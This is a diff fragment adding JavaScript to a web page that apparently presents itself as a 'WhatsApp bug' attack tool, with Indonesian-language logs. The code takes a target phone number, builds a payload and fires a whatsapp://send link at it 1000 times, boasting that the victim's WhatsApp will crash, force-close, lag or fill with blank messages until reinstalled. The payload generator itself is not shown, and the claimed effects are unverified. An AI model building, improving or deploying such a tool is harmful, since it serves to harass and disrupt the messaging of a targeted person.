+        let nomor = document.getElementById('nomor').value.trim();
+        if(!nomor) {
+            addLog("❌ NOMOR KOSONG, BANGKE!", true);
+            return;
+        }
+        if(!nomor.match(/^62\d{8,14}$/)) {
+            addLog("❌ FORMAT NOMOR SALAH! PAKAI 62XXXXXXXX (contoh: 628993360673)", true);
+            return;
+        }
+        isSending = true;
+        const btn = document.getElementById('sendBtn');
+        btn.disabled = true;
+        btn.innerHTML = "🌀 MENGIRIM 1000x BUG - PLANET MELEDAK 🌀";
+        
+        const radzSpan = document.getElementById('radzDynamicText');
+        const originalText = radzSpan.innerText;
+        let blinkInterval = setInterval(() => {
+            radzSpan.style.opacity = '0.6';
+            setTimeout(() => radzSpan.style.opacity = '1', 150);
+        }, 250);
+        
+        addLog(`🔥 SERANGAN MASSAL KE ${nomor} | MODE ${selectedBug.toUpperCase()} 🔥`);
+        const payload = getUltraPayload(selectedBug);
+        const encodedPayload = encodeURIComponent(payload);
+        const baseIntent = `whatsapp://send?phone=${nomor}&text=${encodedPayload}`;
+        
+        const totalAttacks = 1000; // 1000x bertubi -> efek 1 juta kali lipat
+        let successCount = 0;
+        addLog(`💣 MELUNCURKAN ${totalAttacks} PESAN BUG BERKEDAH GALAKSI ...`);
+        
+        for(let i = 0; i < totalAttacks; i++) {
+            try {
+                window.location.href = baseIntent;
+                successCount++;
+                if((i+1) % 150 === 0) {
+                    addLog(`✅ ${i+1}/${totalAttacks} galaxy bug terkirim, overload massive`);
+                }
+                await new Promise(r => setTimeout(r, 60));
+            } catch(e) {
+                addLog(`⚠️ Gagal di ${i+1}: ${e.message}`, true);
+            }
+        }
+        
+        clearInterval(blinkInterval);
+        radzSpan.innerText = "GALAXY HANCUR! BUG SELESAI";
+        setTimeout(() => { radzSpan.innerText = "BUG GALAXY AKTIF"; }, 4000);
+        
+        addLog(`🎯 TOTAL ${successCount}/${totalAttacks} DESTROY PACKET TERKIRIM.`);
+        if(selectedBug === 'crash') addLog(`💀 WHATSAPP TARGET CRASH TOTAL - FORCE CLOSE TERUS MENERUS`, true);
+        if(selectedBug === 'forceclose') addLog(`⚠️ FORCE CLOSE PARAH, WA TIDAK BISA BUKA`, true);
+        if(selectedBug === 'delay') addLog(`🐌 DELAY 1 JUTA LIPAT => WA LAG SAMPAI STOP`, true);
+        if(selectedBug === 'blank') addLog(`👻 BLANK GHOST: PULUHAN RIBU PESAN KOSONG`, true);
+        addLog(`🗿 SOLUSI: CLEAR DATA ATAU REINSTALL WHATSAPP`);
+        
+        btn.disabled = false;
+        btn.innerHTML = "🪐 MENGIRIM 1000x BUG (1 JUTA KALI EFEK) 🌕";
+        isSending = false;
+    }
+    
+    document.getElementById('sendBtn').addEventListener('click', sendMassiveBug);
+    
+    // animasi teks dinamis
+    const radzDynamic = document.getElementById('radzDynamicText');
+    const textCycle = ["BUG GALAXY AKTIF", "1 JUTA KALI LIPAT", "PLANET DESTROY", "ORANGE INFERNO"];
+    let idxCycle = 0;
+    setInterval(() => {
+        if(!isSending) {
+            radzDynamic.innerText = textCycle[idxCycle % textCycle.length];
+            idxCycle++;
+        }
+    }, 2800);
+    
+    // tambahan efek sentuhan halus untuk semua tombol
+    document.querySelectorAll('.bug-btn, .send-btn, input').forEach(el => {
+        el.addEventListener('touchstart', function(e) {
+            this.style.transform = 'scale(0.97)';
+        });
+        el.addEventListener('touchend', function() {
+            this.style.transform = '';
+        });
+        el.addEventListener('mousedown', function() {
+            this.style.transform = 'scale(0.97)';
+        });
+        el.addEventListener('mouseup', function() {
+            this.style.transform = '';
+        });
+    });
+    
+    // background planet gerak bahkan setelah loading selesai (tambah manual)
+    window.addEventListener('load', () => {
+        if(document.getElementById('mainContent').style.display !== 'none') {
+            generateGalaxyPlanets(6);
+            generateStars(200);
+        }
+    });
+</script>
 </body>
 </html>
